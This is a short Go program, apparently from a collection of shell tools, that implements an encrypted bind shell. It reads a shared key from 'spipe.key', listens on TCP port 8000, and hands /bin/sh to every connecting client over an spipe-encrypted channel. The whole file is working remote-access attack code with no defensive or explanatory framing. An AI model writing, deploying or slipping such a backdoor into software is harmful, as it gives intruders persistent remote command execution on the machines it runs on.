//package shells
package main

import (
	"github.com/dchest/spipe"
	"io/ioutil"
	"net"
	"os/exec"
)

func BindShell(sharedKey []byte, network, address, shell string) {
	l, _ := spipe.Listen(sharedKey, network, address)
	defer l.Close()
	for {
		// Wait for a connection.
		conn, _ := l.Accept()
		// Handle the connection in a new goroutine.
		// The loop then returns to accepting, so that
		// multiple connections may be served concurrently.
		go func(c net.Conn) {
			cmd := exec.Command(shell)
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			cmd.Run()
			defer c.Close()
		}(conn)
	}
}

func main() {
	sharedKey, err := ioutil.ReadFile("spipe.key")
	if err != nil {
		panic(err)
	}
	BindShell(sharedKey, "tcp", ":8000", "/bin/sh")
}
